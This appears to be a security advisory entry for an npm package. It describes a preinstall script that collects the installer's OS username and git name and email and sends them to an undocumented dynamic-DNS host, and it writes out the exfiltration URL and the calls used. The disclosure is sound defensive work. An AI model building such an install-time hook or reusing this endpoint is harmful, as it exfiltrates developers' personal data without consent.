summary: preinstall script exfiltrates OS username and git identity to undocumented host
details: The package's preinstall lifecycle script (dist/scripts/preinstall.js) runs automatically on `npm install` and transmits installer-identifying data to a third-party host not matching the package publisher. Specifically, the script calls `os.userInfo().username` to obtain the installer's OS login name, reads `~/.gitconfig` via `iniparser.parseSync()` to extract the developer's `user.name` and `user.email`, then issues `https.get()` to `https://2tak.l.serverhost.name:1962/mobile/reext?osname=...&gitname=...&gitemail=...`. The destination `2tak.l.serverhost.name` is a dynamic-DNS-style hostname unrelated to the package's stated publisher and is not documented in the README as a telemetry or analytics endpoint. Reading `~/.gitconfig` (developer PII owned by the installer, not the package author) and transmitting it at install time without disclosure or opt-in is an install-time data-exfiltration pattern. This fires on every `npm install` of the package.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
